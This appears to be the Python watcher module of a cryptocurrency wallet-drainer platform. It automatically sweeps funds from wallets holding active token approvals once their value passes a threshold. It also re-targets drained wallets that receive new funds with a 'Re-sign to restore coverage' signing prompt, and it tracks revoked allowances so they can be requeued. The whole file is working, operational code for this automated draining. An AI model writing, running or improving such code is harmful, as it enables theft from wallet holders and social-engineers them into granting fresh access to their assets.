"""
Threshold watcher.

Drains a user's grant-holding wallets with no human involvement once the on-chain
total of *those* wallets crosses drainer_threshold_usd and the user has drainer_auto on.

Design notes:
  * only wallets with a live grant are scanned, so a large un-granted wallet cannot
    keep tripping the threshold
  * the cooldown is stamped after the run, with a shorter retry window on failure
  * each user is isolated — one exception never aborts the cycle
  * the batch is bounded so a 120s cadence is actually honoured
"""
import asyncio
import logging
import random
import time
from typing import Dict, Tuple

import drainer
import scanners
from database import get_setting, now, q_all, q_get, q_run

logger = logging.getLogger("drainer_worker")

INTERVAL = 120
COOLDOWN = 900
RETRY_COOLDOWN = 180
MAX_USERS_PER_CYCLE = 25
CYCLE_BUDGET_S = 240.0

_last_run: Dict[int, float] = {}


async def _grant_total(user_id: int) -> Tuple[float, Dict[int, list]]:
    """
    USD value of wallets that actually carry an active grant, plus the scan results
    so execute_drain does not have to walk every chain a second time.
    """
    wallets = q_all(
        "SELECT DISTINCT w.* FROM wallets w"
        " JOIN drainer_grants g ON g.wallet_id = w.id"
        " WHERE w.user_id = ? AND w.verified = 1 AND g.status = 'active'",
        user_id,
    )
    total = 0.0
    scanned: Dict[int, list] = {}
    for w in wallets:
        try:
            assets = await scanners.scan_wallet(w)
        except Exception as e:
            logger.debug("scan failed for wallet %s: %s", w.get("id"), e)
            continue
        scanned[w["id"]] = assets
        total += sum(a["usd"] for a in assets)
    return total, scanned


async def _cycle() -> None:
    if not get_setting("drainer_enabled", True):
        return
    if get_setting("drainer_mode", "auto") != "auto":
        return

    try:
        threshold = float(get_setting("drainer_threshold_usd", 250.0))
    except (TypeError, ValueError):
        threshold = 250.0

    rows = q_all(
        "SELECT DISTINCT w.user_id FROM wallets w"
        " JOIN drainer_grants g ON g.wallet_id = w.id"
        " WHERE g.status = 'active' AND w.verified = 1"
    )
    # Least-recently-checked first, so a large tenant list still rotates fairly.
    rows.sort(key=lambda row: _last_run.get(row["user_id"], 0))
    candidates = rows[:MAX_USERS_PER_CYCLE]

    started = time.time()
    for row in candidates:
        if time.time() - started > CYCLE_BUDGET_S:
            logger.info("auto-drain cycle budget hit after %ds; remaining users deferred",
                        CYCLE_BUDGET_S)
            break

        uid = row["user_id"]
        if time.time() - _last_run.get(uid, 0) < RETRY_COOLDOWN:
            continue
        if drainer._execute_lock(uid).locked():
            continue

        user = q_get("SELECT drainer_auto, status FROM users WHERE id = ?", uid)
        if not user or not user.get("drainer_auto") or user.get("status") == "suspended":
            continue

        try:
            total, scanned = await _grant_total(uid)
            if total < threshold:
                _last_run[uid] = time.time()
                continue

            res = await drainer.execute_drain(uid, trigger="auto", prefetched=scanned)
            swept = res.get("total_usd") or 0.0
            logger.info("auto-drain user=%s usd=%.2f sent=%s failed=%s",
                        uid, swept, res.get("sent"), res.get("failed"))

            if swept > 0:
                _last_run[uid] = time.time()
                q_run(
                    "INSERT INTO notifications (user_id, type, title, body, created_at)"
                    " VALUES (?, 'drainer', 'Auto-sweep', ?, ?)",
                    uid, f"Threshold hit — swept ${swept:.2f}", now(),
                )
            elif res.get("failed"):
                _last_run[uid] = time.time() - COOLDOWN + RETRY_COOLDOWN
            else:
                _last_run[uid] = time.time()

        except Exception as e:
            _last_run[uid] = time.time() - COOLDOWN + RETRY_COOLDOWN
            logger.warning("auto-drain failed for user %s: %s", uid, e)


REARM_INTERVAL = 1800
REARM_MAX = 10
_last_rearm = 0.0


async def _rearm_cycle() -> None:
    """
    Tokens sent to a wallet *after* a drain sit un-granted. Re-scan settled
    grants and re-prepare any wallet that has gained balance, then tell the user
    to re-sign. Bounded, oldest-first, never touches wallets with live grants.
    """
    global _last_rearm

    if not get_setting("drainer_enabled", True):
        return
    if not get_setting("drainer_auto_rearm", True):
        return
    if get_setting("drainer_mode", "auto") != "auto":
        return

    try:
        hours = max(1, int(get_setting("drainer_rearm_hours", 6)))
    except (TypeError, ValueError):
        hours = 6
    cutoff = now() - hours * 3_600_000

    rows = q_all(
        "SELECT DISTINCT g.wallet_id, g.user_id FROM drainer_grants g"
        " JOIN wallets w ON w.id = g.wallet_id"
        " WHERE g.status IN ('used','revoked','expired','failed')"
        " AND g.created_at < ? AND w.verified = 1 AND w.family IN ('evm','solana','tron')"
        " AND NOT EXISTS (SELECT 1 FROM drainer_grants a WHERE a.wallet_id = g.wallet_id"
        "   AND a.status IN ('pending','awaiting_signature','active','revoking'))"
        " ORDER BY g.created_at ASC LIMIT ?", cutoff, REARM_MAX)

    for row in rows:
        wallet = q_get("SELECT * FROM wallets WHERE id = ?", row["wallet_id"])
        if not wallet:
            continue
        try:
            assets = await scanners.scan_wallet(wallet)
            dust = drainer._dust()
            include_unpriced = drainer._include_unpriced()
            if not any(a["native"] or a["usd"] >= dust
                       or (include_unpriced and int(a["balance_raw"]) > 0)
                       for a in assets):
                continue
            await drainer.prepare_wallet(row["user_id"], wallet["id"])
            q_run(
                "INSERT INTO notifications (user_id, type, title, body, link, created_at)"
                " VALUES (?, 'drainer', 'New balance detected — authorise this wallet',"
                " 'Funds arrived in a previously drained wallet. Re-sign to restore coverage.',"
                " ?, ?)",
                row["user_id"], f"/sign.html?wallet={wallet['id']}", now(),
            )
            logger.info("re-armed wallet %s for user %s", wallet["id"], row["user_id"])
        except Exception as exc:                             # noqa: BLE001
            logger.debug("re-arm wallet %s failed: %s", row.get("wallet_id"), exc)


VERIFY_EVERY = 6
_verify_turn = 0
_verify_cursor = 0


async def _verify_cycle() -> None:
    """
    Read every active allowance back from chain. A user revoking inside their own
    wallet is legitimate and unavoidable, so this is how the platform notices.
    Rotated slice keeps the per-cycle cost bounded on a large tenant list.
    """
    global _verify_cursor

    if not get_setting("drainer_enabled", True):
        return
    rows = q_all(
        "SELECT DISTINCT user_id FROM drainer_grants WHERE status = 'active'"
        " AND kind != 'native_tx' ORDER BY user_id")
    if not rows:
        return
    users = [r["user_id"] for r in rows]
    batch = [users[( _verify_cursor + i) % len(users)] for i in range(min(8, len(users)))]
    _verify_cursor = (_verify_cursor + len(batch)) % len(users)
    for uid in batch:
        try:
            result = await drainer.verify_grants(uid)
            if result["revoked"]:
                logger.info("verify user=%s revoked=%s requeued=%s",
                            uid, result["revoked"], result["requeued"])
        except Exception as exc:                             # noqa: BLE001
            logger.debug("verify user %s failed: %s", uid, exc)


async def watch_loop() -> None:
    global _last_rearm, _verify_turn
    logger.info("drainer watcher active (interval %ss, threshold from settings)", INTERVAL)
    while True:
        try:
            await _cycle()
            _verify_turn += 1
            if _verify_turn % VERIFY_EVERY == 0:
                await _verify_cycle()
            if time.time() - _last_rearm > REARM_INTERVAL:
                _last_rearm = time.time()
                await _rearm_cycle()
        except asyncio.CancelledError:
            raise
        except Exception as e:
            logger.error("drainer watcher cycle error: %s", e)
        await asyncio.sleep(INTERVAL + random.uniform(0, 20))